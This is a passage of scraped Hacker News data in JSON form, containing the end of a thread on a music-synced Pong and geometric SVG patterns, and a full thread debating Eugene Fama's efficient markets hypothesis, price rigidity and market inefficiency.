'user facing' in the live version - But the manual controls (middle) and the svg+path html tags (right) are included in this demo in order to show some of the 'behind the scenes'. Code not yet available, app not yet available to play with. Other geometric patterns in the app that I have implemented: - Modified Maurer - Cosine Rose Curve - Modified Rose Curve - Cochleoid Spiral - Lissajous Curve - Hypotrochoid Spirograph - Epitrochoid Spirograph - Lorenz Attractor - Dragon Curve - Two Pendulum Harmonograph - Three Pendulum Harmonograph - Four Pendulum Harmonograph This is the Typescript Maurer Rose function (that is used with setInterval + an object array of beat times which determine when to advance the 'n' variable): export const generateGeometricsSimplemaurer = (n: number, d: number, scale: number = 1) => { const pathArray: TypeSvgPathArray = []; for (let i = 0; i <= 360; i += 1) { const k = i \\* d; const r = Math.sin(n \\* k \\* (Math.PI / 180)); const x = r \\* Math.cos(k \\* (Math.PI / 180)) \\* 40 \\* // base scale scale + 50; // to center the image const y = r \\* Math.sin(k \\* (Math.PI / 180)) \\* 40 \\* // base scale scale + 50; // to center the image pathArray.push(\\${i === 0 ? \"M\" : \"L\"} ${x} ${y}`);` } const pathString: string = pathArray.join(\" \"); return pathString; }; setInterval isn't an appropriate solution for the long term. The geometric patterns (with their controls) will have a playground app that you can use to adjust variables... As for the music sync side, it will probably take me a long time. *Edit: I just noticed that the author (Victor Tao) actually works at Suno reply tongbaojia 4 hours agoprev [–] Awesome work bro! Your company is hiring? I'd be super thrilled to work with you. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "A new project synchronizes the classic game Pong to music using constrained optimization, creating a visually engaging experience.",
      "Unlike previous efforts that manually sync to the song's beats per minute (BPM), this approach uses advanced techniques for a more dynamic visualization.",
      "The project has sparked interest and discussions about potential applications, including reinforcement learning and rhythm-based gameplay similar to \"Crypt of the NecroDancer\" and \"Cadence of Hyrule.\""
    ],
    "points": 153,
    "commentCount": 18,
    "retryCount": 0,
    "time": 1725369573
  },
  {
    "id": 41432086,
    "title": "Economist Eugene Fama: 'Efficient markets is a hypothesis. It's not reality",
    "originLink": "https://www.ft.com/content/ec06fe06-6150-4f39-8175-37b9b61a5520",
    "originBody": "Accessibility helpSkip to navigationSkip to contentSkip to footer Sign In Subscribe Open side navigation menuOpen search bar SubscribeSign In Search the FT SearchClose search bar Home World Sections World Home Israel-Hamas war Global Economy UK US China Africa Asia Pacific Emerging Markets Europe War in Ukraine Americas Middle East & North Africa Most Read A Trump loss could stabilise US politics for a generation Dan Neidle: ‘A UK wealth tax wouldn’t work’ Concern over housing costs hits record high across rich nations Lessons from the great inflation London slower to return to office than New York and Paris US Sections US Home US Economy Investing in America US Companies US Politics & Policy US Presidential Election 2024 Most Read A Trump loss could stabilise US politics for a generation Lessons from the great inflation Americans are losing faith in four-year college degrees Is Jay Powell lucky or good? US seizes aircraft used by Venezuela’s Maduro Companies Sections Companies Home Energy Financials Health Industrials Media Professional Services Retail & Consumer Tech Sector Telecoms Transport Most Read Ukraine energy chief ousted in ‘politically motivated’ move HMRC to allow fractional shares in Isas ahead of rule change Brazilians flock to Bluesky after court bans Musk’s X Bad movies prove profit can be a force for good in film UK secures 131 clean energy projects in state auction Tech Sections Tech Home Artificial intelligence Semiconductors Cyber Security Social Media Most Read Brazilians flock to Bluesky after court bans Musk’s X Huawei’s bug-ridden software hampers China’s efforts to replace Nvidia in AI Blackstone set to acquire Australian data centre business AirTrunk Google’s James Manyika: ‘The productivity gains from AI are not guaranteed’ Regulators will always struggle to keep pace with AI development Markets Sections Markets Home Alphaville Markets Data Crypto Capital Markets Commodities Currencies Equities Wealth Management Moral Money ETF Hub Fund Management Trading Most Read HMRC to allow fractional shares in Isas ahead of rule change Citadel Securities leads fight over payments for market surveillance system Morgan Stanley renews efforts to regain stock trading crown North Sea oil and gas producers are not bluffing over tax Is Jay Powell lucky or good? Climate Opinion Sections Opinion Home Columnists The FT View The Big Read Lex Obituaries Letters Most Read A Trump loss could stabilise US politics for a generation Lessons from the great inflation Bad movies prove profit can be a force for good in film Elon Musk is an unguided geopolitical missile The far-right’s disturbing success in eastern Germany Lex Work & Careers Sections Work & Careers Home Business School Rankings Business Education Europe's Start-Up Hubs Entrepreneurship Recruitment Business Books Business Travel Working It Most Read London slower to return to office than New York and Paris Google’s James Manyika: ‘The productivity gains from AI are not guaranteed’ The dangers of staking your career on the company’s rising star Streets ahead: Zürich’s astonishing public art scene Does a masters in management plus an MBA add up? Life & Arts Sections Life & Arts Home Arts Books Food & Drink FT Magazine House & Home Style Travel FT Globetrotter Most Read Bad movies prove profit can be a force for good in film Rose Ferguson, the model-turned-nutritionist who tells Kate Moss what to eat How to keep it safe The Third Man at 75: still the enigmatic masterpiece of British cinema Firouzja wins in St Louis as world champion Ding fails again HTSI MenuSearch Home World US Companies Tech Markets Climate Opinion Lex Work & Careers Life & Arts HTSI Financial Times SubscribeSign In Search the FT SearchClose search bar Economist Eugene Fama: ‘Efficient markets is a hypothesis. It’s not reality’ Subscribe to unlock this article Try unlimited access Only $1 for 4 weeks Then $75 per month. Complete digital access to quality FT journalism on any device. Cancel anytime during your trial. Keep reading for $1 Explore more offers. Standard Digital $39 per month Essential digital access to quality FT journalism on any device. Pay a year upfront and save 20%. Select What's included Premium Digital $75 per month Complete digital access to quality FT journalism with expert analysis from industry leaders. Pay a year upfront and save 20%. Select What's included Print + Premium Digital $199 for 3 months Billed Yearly at $745. Complete digital access plus the FT newspaper delivered Monday-Saturday. Select What's included Terms & Conditions apply Explore our full range of subscriptions. For individuals Discover all the plans currently available in your country Digital Print Print + Digital For multiple readers Digital access for organisations. Includes exclusive features and content. FT Professional Check whether you already have access via your university or organisation. Why the FT? See why over a million readers pay to read the Financial Times. Find out why Useful links Support View Site TipsHelp CentreContact UsAbout UsAccessibilitymyFT TourCareers Legal & Privacy Terms & ConditionsPrivacy PolicyCookie PolicyManage CookiesCopyrightSlavery Statement & Policies Services Share News Tips SecurelyIndividual SubscriptionsProfessional SubscriptionsRepublishingExecutive Job SearchAdvertise with the FTFollow the FT on XFT ChannelsFT Schools Tools PortfolioFT AppFT Digital EditionFT EditAlerts HubBusiness School RankingsSubscription ManagerNews feedNewslettersCurrency Converter Community & Events FT CommunityFT Live EventsFT ForumsBoard Director Programme More from the FT Group Markets data delayed by at least 15 minutes. © THE FINANCIAL TIMES LTD 2024. FT and ‘Financial Times’ are trademarks of The Financial Times Ltd. The Financial Times and its journalism are subject to a self-regulation regime under the FT Editorial Code of Practice. Close side navigation menu Edition:International UK Search the FT Search Subscribe for full access Top sections Home WorldShow more World Israel-Hamas war Global Economy UK US China Africa Asia Pacific Emerging Markets Europe War in Ukraine Americas Middle East & North Africa USShow more US US Economy Investing in America US Companies US Politics & Policy US Presidential Election 2024 CompaniesShow more Companies Energy Financials Health Industrials Media Professional Services Retail & Consumer Tech Sector Telecoms Transport TechShow more Tech Artificial intelligence Semiconductors Cyber Security Social Media MarketsShow more Markets Alphaville Markets Data Crypto Capital Markets Commodities Currencies Equities Wealth Management Moral Money ETF Hub Fund Management Trading Climate OpinionShow more Opinion Columnists The FT View The Big Read Lex Obituaries Letters Lex Work & CareersShow more Work & Careers Business School Rankings Business Education Europe's Start-Up Hubs Entrepreneurship Recruitment Business Books Business Travel Working It Life & ArtsShow more Life & Arts Arts Books Food & Drink FT Magazine House & Home Style Travel FT Globetrotter Personal FinanceShow more Personal Finance Property & Mortgages Investments Pensions Tax Banking & Savings Advice & Comment Next Act HTSI Special Reports FT recommends Alphaville FT Edit Lunch with the FT FT Globetrotter #techAsia Moral Money Visual and data journalism Newsletters Video Podcasts News feed FT Live Events FT Forums Board Director Programme myFT Portfolio FT Digital Edition Crossword Our Apps Help Centre Subscribe Sign In",
    "commentLink": "https://news.ycombinator.com/item?id=41432086",
    "commentBody": "Economist Eugene Fama: 'Efficient markets is a hypothesis. It's not reality (ft.com)151 points by Anon84 11 hours agohidepastfavorite150 comments legitster 5 hours agoThe way \"efficient markets\" were taught in my econ classes was similar to the idea of a \"limit\" in calculus. A market can never reach efficiency but it can approach at ever diminishing returns. Efficiency can also include non-tangible value. A lot of people want to own Tesla shares because it makes them feel cool or techie, so it trades at a huge premium over the fundamentals. But it doesn't change the fact that if there is an expected increase or decrease in company performance, the going share price will still adjust amazingly quickly. So \"efficiency\" is really in the eye of the beholder. One person can look at a circle from 10 feet away and say, \"look a perfect circle!\" and the other can say \"there are no perfect circles\" and the second person can be technically correct, but the first person's observation may be perfectly valid. reply atoav 5 hours agoparentThe idea that markets approach efficiency is a hypothesis. Markets could also approach maximum exploitation. That is another hypothesis. Which one is better at explaining any given economic system is a matter of interpreting the data and trying not to lie to yourself. The problem with most of economic science is that latter part. Where most other sciences try to decouple themselves from their subject or at least aknowledge the limitations of their field, many economists seem to have a much more loose relationship with their field. E.g. if a hypothesis failed to explain so many real world phenomena as many popular economic ideas, any natural scientist would throw their hands in the air and admit they had no idea what was actually going on. Yet my feeling isn't that economists are like: \"We have that part here figured out and that part over there is work in progress\" but more of an airquotes-science, like Lacanism or Freudianism, where what you say depends on whose school of thought you subscribe to. Granted if one imagined how a truly serious about describing-what-is-economic-science would have to work like, that would be a gargantuan endeavour as it not only encompasses mathematics and complex systems, but also fields like psychology, sociology and geography. So I am the last to blame any serious economist for not being able to explaining everything. What I can however blame them for is when they defend a hypothesis that has been falsified by reality countless times by moving the goal posts by saying the conditions have to be just right for their hypothesis to make sense. Yeah sure. reply gmd63 4 hours agorootparentHistory of economic thought should be covered in Economics 101 to really drive this point home. Going through the entire history of the discipline you recognize that the practical purpose of economics is mainly serving to justify a society wide experiment on why the latest theory is wrong. reply legitster 3 hours agorootparentI still have my Econ 101 textbook. History of economic thought was indeed the first several chapters we covered. reply rrrrrrrrrrrryan 2 hours agorootparentprevYour critique of the field would be largely correct a half century ago when theory and ideology reigned, but if you speak to any group of econ doctoral candidates today I think you'd be surprised how hard they're genuinely striving to root themselves (and the discipline at large) in empiricism and evidence-based thought. The old guard still runs the show, of course, and the field will advance one death at a time. reply legitster 3 hours agorootparentprevI'm not sure if you read the article in question - but it is literally interviewing Fama (the person who coined the term \"efficient market hypothesis) about ways markets continue to be inefficient. Regardless of how much efficiency there is or is not, it's still a good theoretical framework for understanding markets. No one assumes the cost of a wheat future is a completely made up number so obviously there is some efficiency. reply atoav 3 hours agorootparentMy point wasn't about the hypothesis of efficiency per sé. It was about the field of a whole. I have nothing against useful tools or models. But all too often these get confused with reality in economics — with potentially world-changing consequences. Granted this wasn't the point of the article, it was more like a tangential thought. reply readthenotes1 2 hours agorootparentprevEconomy is astrology with fancy math... reply sudosysgen 5 hours agoparentprevActually, prices change far less than you would expect and more slowly than they should if they were to reflect information. See: https://en.wikipedia.org/wiki/Nominal_rigidity This isn't too much of a thing for stocks (most likely because they aren't production inputs), but that's a small part of price signals. In general, the most important prices do not adjust amazingly quickly, because our economy is far too slow and unwieldy and unable to cope with price uncertainty. reply legitster 5 hours agorootparentRigidity is usually applied to common markets which everyone agrees are pretty inefficient. Efficient markets hypothesis was written specifically with stock markets and exchanges in mind, and it's what the linked article mostly discussed. reply sudosysgen 4 hours agorootparentRigidity is not thought to be about attributes of the markets, it is a consequence of the productive process that belies them. That it only applies to inefficient markets is circular reasoning, if rigidity makes a market inefficent then surely it applies to inefficient markets. Stock markets are ultimately downstream of production, it is impossible to divorce the efficiency of commodity markets from the efficiency of capital markets. Rigidity is contagious. Firms with sticky prices are wildly considered to incur costs and more negative responses to various macroeconomic conditions, and those costs reduce the valuation of equities, so the inefficiency in production is reflected in equity prices. If prices were not rigid we would see different equity prices. You can try to fix this by looking at every transaction level in isolation and baking in the bias of the next level, but then you're no longer making a statement about the economy and the efficiency of price signals. Instead, you're making an essentially unverifiable statement about the profitability of a limited set of strategies restricted to long/short positions in equities only (which on average is forced to be exactly equal to the market price since every transaction needs a counterparty): Even if there is a hidden variable that makes some strategies better, it will most likely be impossible to pick out which strategies are better because of luck and which are better for a reason if you are modelling the null hypothesis as some sort of random walk with long tail event, the hidden variable will most likely be lost in the noise. You can also try testing it by looking at prices directly, in which case Roll's critique holds. In short, as a broader theory to apply to economic relations and economic calculation, the EMH doesn't hold. As a narrow theory of the profitability of certain trading strategies, it's unverifiable. reply pjc50 10 hours agoprevSee https://papers.ssrn.com/sol3/papers.cfm?abstract_id=1773169 \"Markets are Efficient if and Only if P = NP\" The market (in any good) is an information processing system which tries to collate a colossal number of variables down to a single one: price. It has the same limitations as other information processing systems, as well as things you may be familiar with from control theory like frequency response. reply jl6 8 hours agoparentIf prices encode information, then we are talking about a one-way encoding. You can’t turn that price back into a description of the whole vast supply chain behind it. That gives us another problem: prices can’t tell us whether a price is low for good reasons (efficient processes, technological innovation, economies of scale perhaps) or bad reasons (pollution externalities not included, use of forced labor, low quality ingredients, corners cut). Understanding these factors (“quality”) becomes a complex ordeal and the price doesn’t help. It seems like we have an economy which is highly optimized at reducing price, but extremely primitive at making “quality” transparent enough that price can be properly assessed. A case in point being Amazon marketplace where you can find very low priced products from completely opaque brands with almost zero signal on quality. reply hulium 6 hours agorootparentRelated is the theory of the \"Lemon Market\": https://en.wikipedia.org/wiki/The_Market_for_Lemons If the buyer cannot estimate the quality of the product before buying, the sellers will reduce quality or be forced to by competition. Buyers lose trust and the market can collapse. reply pjc50 5 hours agorootparentThe Akerloff Market for Lemons paper is really important. It explains so many things, like why people very rarely pay upfront for mobile games or online articles. reply datavirtue 4 hours agorootparentAccording to this, Walmart ruined toasters. reply pjc50 3 hours agorootparent? reply ghaff 5 hours agorootparentprevThe problem there is that the owner of a car that’s good as far as they know (but not a given as a major repair of an older car could be just around the corner) may sell anyway so they can buy a new car even if they think they’re not getting a good deal. But certainly of cars that know they have major not easily detectable problems will be much quicker to sell or trade in. (I know.) reply kitd 7 hours agorootparentprevHence the obsession with customer reviews. In the absence of an objective measure of quality, the easiest to implement is a star rating of \"what everyone else thinks about this product\". reply dredmorbius 6 hours agorootparentEasy != Informative. Such review systems are trivially gamed, with exceedingly high incentives to do so. One of the underappreciated benefits of an established retailier with limited suppliers and a centralised buying operation, as with traditional brick-and-mortar establishments (Harrods, Costco, Macy's, etc.) is that those establishments can set their own minimum standards and select merchandise which is highly likely to provide high value to the end customer. The notion that \"choice is good\" falls flat in the reality that uninformed choice over a range of intentionally insufficient products is not good, and is in fact a form of gambling with low payoffs. Some retailers target high-end products (e.g., Harrods), some mid- or low-market (e.g., Costco). But by restricting upstream vendors, tracking satisfaction, and having their own testing and development of products or offerings, as well as return/warrantee programmes, they can assure a reasonable rate of satisfaction. I'm also finding retailers who sell manifest crap (o hai any Samsung home appliances) can be eliminated from my own list of acceptable outlets for future purchases. reply kitd 5 hours agorootparent> Easy != Informative. Oh sure, absolutely, but note I said \"easiest to implement\". And there's that cost measure again, as if it's the only KPI. How do we measure the quality of the \"quality\" system? :) reply dredmorbius 5 hours agorootparentWhat elements of the quality system's quality would you think need assessing? (I think your question's a valid one, and a quite good one ... a high-quality question, if you will. I also Have Thoughts, but would prefer to see you expand your question before polluting the idea space with my own biases and opinions. Though if I may steer the conversation somewhat: audits. Of what and how would be informed to your response to my first question though.) reply fredgrott 6 hours agorootparentprevprices do not encode information! Prices are a reduction of information in that since decisions that lead to price being set are past that information gets reduced. Or to put it another way for an investor speculator they have to go to the chain that goes into producing that product to find the signals to use to short or buy a stock...not the price of the good itself.. reply lazide 7 hours agorootparentprevYou were making sense for a bit, then kind of went off the rails? For instance, forced labor, pollution, etc. are factored into price. Or more specifically, the customers willingness to care about these things is factored into the price, on the buy side. And someone’s willingness and ability to do them (or hide them) is priced on the sell side. Same with the customers willingness to gamble on quality (aka random no name branding), and a sellers willingness to deal with legal and reputational blowback. People just don’t want to say it. At the end of the day, as long as no one is going to shame them or punish them, most people will happily fund super polluting slave labor and gamble on quality for a cheap price. Hell, as has been made clear over and over again, people will happily risk serious legal consequences and even murder people to supply/consume illegal goods that get them high, at a price. And that price is a lot lower than most people want to think about. And this is where the EMH bears actual fruit - because the ultimate test is people’s willingness to part with their cash for a good. And both sides of the transaction are always trying to figure out ways to shift the line where they both meet in their favor. It’s not about what they say, what they profess to believe, what is acceptable to admit, what is legal (per-se), etc. unless it actually matters. Which is rarely as often as we’d all like to believe. reply SamoyedFurFluff 7 hours agorootparent> For instance, forced labor, pollution, etc. are factored into price. Or more specifically, the customers willingness to care about these things is factored into the price, on the buy side. And someone’s willingness and ability to do them is priced on the sell side. I don’t agree with this. Pollution primarily affects people who cannot afford to pay to not affected by pollution. The people who buy the most polluting products are not the people who are directly exposed to the most pollution. This isn’t as simple as “oh people just don’t feel bad enough to not buy cheap things”, the people who cannot afford to avoid the consequences of societally bad decisions are suffering way beyond their consumption! The poor live most exposed to effects of climate change (fires, floods, etc) because they cannot afford to avoid it, not because they somehow calculated that they don’t feel bad enough about it. The wealthy are not forced to have their house flooded in accordance to the number of cars they own, for example. reply lazide 7 hours agorootparentnext [3 more] [flagged] filleokus 6 hours agorootparentAgree more with you than GP. Revealed preference is a thing, virtue signalling and performative behaviour is rampant. However, you can have a situation in a hypothetical economy where the VAST majority cares deeply about an issue and actually put the wallet where their mouth is. But the aggregate spending is different simply due to an enormous inequality in wealth. The integral of \"revealed preference\" across the population is not the same as a popular vote after all. I guess some people would argue this is the case in western economies, that we \"have no choice\" due to powers at be, but I don't agree with this view. But it's conceivable that in some economies this is, or at least could be, the case. reply lazide 6 hours agorootparentAh, but we’re talking markets. Not votes. Though, politics is power, and power is about money. Or is that sex? I forget. Power definitely does impact markets, as it applies counter pressures on what matters or not, sometimes to the point of making it impossible* for a trade to actually occur. But always shifting what actually matters or not in some direction, and hence influencing prices. Power unexercised is power that de-facto does not exist in the moment, eh? So if the voters aren’t making something illegal (and ensuring enforcement) they aren’t exercising their power to influence that market, and hence that power does not yet exist. And so typically prices will merely reflect the risk premium of the potential. Not have it as fact. And if the rich folk are transacting in these markets, and are using their power to hide and/or obfuscate that they are doing so, to avoid any public influence, that is power that definitely does exist right now.. And markets will reflect that, on the balance, or a trade won’t occur. When trades do occur, EMH gradually forces things towards efficiency. And the more players there are, and the more transactions occur, the more efficiency is inevitable. Barring things like monopolies, regulatory action, etc. * though as the war on drugs (and the persistence of smuggling from antiquity through to the modern day) makes quite apparent, it is actually very difficult to stop all trade when there is a large market ‘potential’ that exists. Trade ‘finds a way’. reply mapt 4 hours agorootparentprevWe will fund super polluting slave labor if the difference to the manufacturers is $1.25 vs $1.65 per unit in costs, but the manufacturers charge us $5 for the unethical unit and $20 for the ethical unit. That's not to say we wouldn't spend $5.40 for entirely ethical production; We are not granted that choice. In a wildly unregulated market with little oversight, establishing the chain to demonstrate ethical viability is expensive, and only people who have a lot of income and spare time can afford to even be worried about this. Right now, ethical production in many areas of world trade is dominated by a fringe marketting strategy to price-segregate customers, because nobody has even tried to regulate a better outcome. Expecting people to spend many hours studying every single thing they consume for signs of malfeasance, especially when most of the data they would require is a trade secret or things which manufacturers are actively incentivized to lie about, is crazy. This information black hole provides a second limit to effective pricing. reply lazide 2 hours agorootparentI would add there is also a prisoners dilemma in any attempt to regulate to ‘good’ labor practices/rates in the global economy. There are, for many clear domestic socio-political reasons (including highly embedded religious and idealogical ones), many countries which are never going to be effectively limited in their untrained labor force, or that have the ability/interest to enforce good labor practices. And there are too many ‘buying’ nations to effectively enforce a Monopsony either. reply datavirtue 4 hours agorootparentprevThe higher priced goods are going to move slower. The $20 price tag reflects the higher quality packaging (to reinforce the message that THIS is better quality) and targeting of higher spending customers, the higher price to the retailer, and the amount of time it has to sit on the shelf. Turnover is king as all retailers and manufacturers are sensitive to holding products. Warehousing has a steep cost. reply mapt 3 hours agorootparent* European double-pane sash windows: Effectively banned by various regulations * American double-pane sash windows on hardware store shelf: $100 * European triple-pane tilt turn windows, on hardware store shelf: $200 * American triple-pane tilt turn windows, 'call for quote': $900 ... * No Salt Added Snacks in the health food section for 10% of people: $4 * Lots of Salt Added Snacks in the main section for 30% of people: $2 * The 60% of people who would prefer a moderate amount of salt for $2: Not a part of the Nash Equilibrium There are all sorts of areas where the market offers suboptimal choices because consumer pricing, availability, product segmentation, and market segmentation is a game that is somewhat orthogonal to the range of consumers' ideal outcomes. Sometimes, regulation significantly improves those outcomes in a way that prices cannot. Banning slave labor is one example where it would be a significant benefit for a trivial cost, but the market absolutely isn't structured to pay that cost using higher prices. Externalities not paid by consumer or manufacturer is one category of those benefits to examine, but there are many more. reply GrantMoyer 6 hours agoparentprevNote that this paper isn't peer reviewed. reply hulium 6 hours agorootparentThe link leads to a journal published paper, why do you think it not peer reviewed? reply GrantMoyer 6 hours agorootparentFrom SSRN's homepage (emphasis mine): > SSRN provides 1,453,207 preprints and research papers from 1,847,303 researchers in over 65 disciplines. It's basically like Arxiv, but focused on different fields. The articles may be preprints of peer reviewed articles published in leading journals, or they may be mad ravings uploaded by a crank, or anything in between. Also see wikipedia's article on SSRN[1]. From SSRN's page on Algorithmic Finance[2], the supposed journal (reachable by following the link under the article title): > The journal archives all papers on SSRN Note that the journal managing editor and contact is the author of the paper, the contact info appears to be his personal contact info, and all links on the page are dead. [1]: https://en.wikipedia.org/wiki/Social_Science_Research_Networ... [2]: https://papers.ssrn.com/sol3/PIP_Journal.cfm?pip_jrnl=167527... reply hulium 5 hours agorootparentI don't think the website where you download the PDF from matters much, the journal claims to be peer reviewed https://www.iospress.com/catalog/journals/algorithmic-financ.... > Note that the \"journal\" editor is the author of the paper. Interesting, I didn't notice that. The journal does have other editors too, see the first page of the PDF. reply Der_Einzige 4 hours agorootparentprevThat’s a good signal. The moment a paper gets peer review at a place like NeurIPS, I know that the chances of the experiment section not being lies goes to zero. reply pembrook 10 hours agoprevMaybe this is a revelation to…someone? I don’t know why Eugene Fama saying this in 2024 is considered news. The guys entire body of research since the 1960s is about market inefficiencies. Amazing that 100 years later we’re still unable to grasp the nuance of the efficiency idea. We settled this one forever ago, but somehow armchair internet commenters still think they can zing the entire field of economics by saying “lol you guys still think people are efficient robots.” Cool 1940s insult, bro. Yes, obviously markets aren’t perfectly efficient and nobody believes they are. But they trend toward efficiency over time. Ignore this at your own peril. reply dredmorbius 7 hours agoparentFama himself proposed the efficient markets hypothesis, to some acclaim: EMH is the closest finance has to a “theory of everything”, and won Fama the Nobel Prize for Economics in 2013. But it remains as controversial today as it did when Fama first proposed it half a century ago. (From TFA.) The fact that the hypothesis's own formulator and presumably chief cheerleader now has his doubts is worthy of comment. reply yzydserd 6 hours agorootparentBecause \"now has his doubts\" adds a temporal change that's incorrect. There is nothing in the article that says he's \"now\" had a suddent shift. He has formed no new \"doubts\". Fama has always made the distinction that it's a hypothesis, not reality. e.g. 'I start my class every year by saying, “These are models. And the reason we call them models is that they’re not 100 percent true. If they were, we would call them reality, not models'. https://www.minneapolisfed.org/article/2007/interview-with-e... So I agree with the GP, \"I don’t know why Eugene Fama saying this in 2024 is considered news.\" reply dredmorbius 5 hours agorootparentThe context of the headline is a current interview with Fama, and the fact that the conversation focuses largely on EMH. Which makes litigating of the title tedious, and failing to fullfil HN's objective of satisfying intellectual curiosity. Dang explains this (in a somewhat different context, but otherwise relevantly) here:reply em500 5 hours agorootparentprevFama's actual position was of course more nuanced than simply declaring that \"markets are efficient\". His key EMH paper [1] notes that a generic formulation of the EMH, that security prices at any time \"fully reflect\" all available information is untestable: you need narrow down the information set and the pathways in which they are reflected in prices. The paper goes over various technical definitions of \"efficiency\" and concludes from reviewing the empirical literature (in 1970) that no evidence against certain formulations (weak, semi-strong) of the EMH has been found/published. I don't think it's fair to characterize Fama as \"chief cheerleader\" of the EMH, but the papers are there for the readers to judge for themselves. [1] https://www.jstor.org/stable/2325486, http://efinance.org.cn/cn/fm/Efficient%20Capital%20Markets%2... reply ksynwa 8 hours agoparentprev> But they trend toward efficiency over time. What does efficiency mean here? And can you support this claim? reply Etheryte 7 hours agorootparentSimply reading an introductory article on the efficient market hypothesis would be a good starting point here, because both of these are basic principles. Efficiency in this context means how quickly and accurately the market incorporates information into asset prices. A very simple example would be a company giving an earnings call, how quickly and accurately after the results are known does the stock price move to reflect the results. If it happens quickly and accurately, the market is efficient, if it takes a long time or is an overcorrection, the market is inefficient. Now expand this concept to all available information at all times for all assets and you roughly have the efficient market hypothesis. Naturally no one thinks that the market is perfectly efficient at all times, but depending on how clear of a signal there is based on available information, the market can be really darn efficient at times. reply foldr 6 hours agorootparentSo it is like the \"Efficient Code Hypothesis\"? No-one thinks that all code is efficient, but some code can be efficient sometimes. reply chii 6 hours agorootparentexcept in the case of the efficient market, if somebody manages to find some inefficiency, they can stand to profit off it by arbitraging that inefficiency (until it disappears). So it's not quite the same as code inefficiency, unless an engineer could reap the reward for the fixing of said inefficiency. reply gmd63 4 hours agorootparentThis isn't true. If you manufacture inefficiency yourself, and control it, nobody can exploit it. In fact if they try to, you can exacerbate the inefficiency in the other direction. Try arbitraging against the inefficient pricing of GameStop. reply tasuki 2 hours agorootparentI don't see how you can manufacture and control inefficiencies in the long term so that nobody can exploit them. How can you arbitrarily exacerbate the inefficiencies? More money has been earned by removing the GameStop inefficiencies than by creating them. GameStop shot up in value driven by WallStreetBets, but those people mostly lost money by creating the inefficiencies. reply chii 2 hours agorootparentprev> If you manufacture inefficiency yourself, and control it that's called a pump and dump, which is already illegal. Because the fraud depends on manufactured (mis)information. reply foldr 6 hours agorootparentprevAh, so it is like the \"Bug Free Code Hypothesis\". If someone is paid to write code, then theoretically that code should be making money for someone, and it should be making them more money if all the bugs were fixed. reply dmix 6 hours agorootparentDo you compare all of your economics to bad programming managers? reply foldr 5 hours agorootparentNot exactly, but I think that analogies with everyday experiences can help to show how silly some of these hypotheses are when considered in more concrete terms. “People have lots of incentives to eliminate Xs, therefore there won’t be any Xs” is an argument schema for which counterexamples abound. To be fair, the \"Bug Free Code Hypothesis\" is kind of true. Because there are lots of incentives to eliminate bugs, people do put a lot of time and effort into doing so – yielding modern miracles such as OS kernels with 30 million lines of code that almost always work as intended. But while software is bug free to a perhaps surprising extent, it would be foolish to plan a software project on the assumption that there will not be any bugs to fix, or that a small number of bugs cannot have a big impact. Similarly, it seems unwise to assume the efficiency of markets in economic planning (though I don't know to what extent economists actually do this). reply dmix 4 hours agorootparentI'm wary to using analogies of smaller team dynamics for wider systems. Markets have a disconnected impersonal nature where things have a way of shaking out. Most of those programming management memes come from big companies with giant teams that don't live or die on output, many of them are shielded from that sort of thing because of cash cows like Microsoft/Google or corporate megadeals like IBM/Oracle. So there's never any shake ups until it's long been obvious to the customers. reply foldr 2 hours agorootparentI'm not using an analogy of smaller team dynamics. One can talk about software bugs in general and the general incentives to fix them just as one can talk about the economy in general and the general incentives for people to make money. I'm also not referencing any programming management memes. I think maybe you're seeing a cynicism in my comment that's not there. I don't think that bugs exists because of dumb managers. I think they exist because it's very difficult to write code without any bugs, even when there are very strong incentives to do so. That's partly just because it's inherently difficult, and partly because there are also other incentives pulling in different directions. reply frereubu 7 hours agoparentprevThere are a substantial minority of people, mainly on the political left in my personal experience, who characterise capitalists / economists as using theories where the market / consumers are perfectly efficient. To me it seems one of those phenomenons where people want to have an opinion on a complex subject, but to do that they need to simplify it to an extent that makes it a completely innacurate caricature, often based on information that's many decades out of date. It drives a friend of mine - who's an experienced economist that builds models of economies - absolutely mad when people blithely say \"but of course you believe that people act rationally and markets are efficient\". reply CuriouslyC 6 hours agorootparentMacro-economic forecasting mostly works but the size of the error bars on the computations are directly proportional to the potential informativeness of the forecast. Micro-economics is a bunch of toy and niche models, where the accuracy of the model is generally inversely correlated with how broadly applicable it is. Economic theory is kind of bullshit, they're building predictive models of enormous complex systems and trying to ascribe meaning, the models can be \"ok\" but the meaning the economists give is personally biased hand waiving about 100% of the time. reply frereubu 5 hours agorootparentI kind of feel like your second paragraph is helping prove my point. And in my experience the people who build these models are very aware of their limitations (even if some of them do then go on to make overly broad conclusions for publication). reply CuriouslyC 3 hours agorootparentThe problem is that economists love to ascribe meaning and make confident statements about causality in order to promote personal ideology rather than let the models speak for themselves. These models predict behavior within a narrow range of conditions, but that doesn't tell you anything about the underlying systems. You can model any function over a restricted domain using polynomials, but that doesn't mean that polynomial function is the ground truth of the universe. reply FrustratedMonky 3 hours agorootparentprevI've never once seen anybody on the left use this argument. On the contrary. It is a religious chant on the Right, that Free Markets are efficient, and The Free-er, the More Efficient, and will solve all of our problems. --> \"All hail our god the free market, efficient in its repose, elegant in its demonstrations, arbiter of logic through the efficient drive of profits, holy in its dispensation of moral judgement, let those that are poor be scorned for the market has judged them unworthy of its riches\". reply frereubu 2 hours agorootparentI think you misread my comment. I'm saying that's how the left unfairly characterise capitalists / economists, which is particularly unfair in the case of economists. reply FrustratedMonky 2 hours agorootparentYeah, I re-read it. Still missing it, are you saying the left un-fairly over-simplifies it. OR the Left portrays the right/economist as un-fairly over-simplifying? reply frereubu 1 hour agorootparentI'm saying the left (not everyone by any means) unfairly oversimplifies the views of economists. Absolutely no-one who is taken even vaguely seriously in economics thinks that consumers are rational or that markets are 100% efficient. reply eqvinox 4 hours agoparentprevIt's the same as \"trickle-down economics\", known to be untrue but the original belief is memetically stronger and sticks around. Simple \"truths\" are easier to believe in... (and easier to regurgitate in short-cycle attention[-span]-deficit news) reply TeaBrain 1 hour agorootparentIt's not the same at all. Efficient Market Hypothesis is the actual given name of an economic hypothesis. \"Trickle Down\" economics is a derogatory term applied to a number of controversial economic policies, by opponent of the policies. reply eqvinox 28 minutes agorootparentThe point of discussion was about how \"this is a revelation to…someone?\" My response was concerning concepts sticking around in wider popular discourse despite being known to not apply particularly well. Did you read past the first 6-8 words? reply foldr 7 hours agoparentprev>But they trend toward efficiency over time The trouble is that, even if this is true, there is no theoretical upper bound on how long it can take. If \"markets trend to efficiency\" means \"don't worry, wait a few years and this inefficient market will be efficient again\", then that's one thing. If it could take a couple of hundred years, 